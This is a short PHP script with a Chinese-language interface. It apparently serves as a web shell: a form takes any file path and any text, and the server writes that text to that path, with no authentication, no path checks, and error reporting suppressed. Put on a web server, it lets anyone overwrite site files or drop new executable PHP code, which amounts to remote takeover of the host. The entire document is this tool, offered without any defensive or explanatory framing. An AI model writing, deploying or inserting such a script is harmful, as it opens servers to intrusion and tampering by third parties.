<?php
header("content-Type: text/html; charset=utf-8");
?>
<form method="POST"></br>
文件保存路径: <input type="text" name="file" size="60" value="<?php echo str_replace('\\','/',__FILE__) ?>">
<br><br>
<textarea name="text" COLS="70" ROWS="18" ></textarea>
<br><br>
<input type="submit" name="submit" value="保存"> 
<form>
<?php
error_reporting(0);
if ($_POST){
	$f=fopen($_POST["file"],"w");
	echo   fwrite($f,$_POST["text"])? '保存成功!' : '保存失败!';
}
?>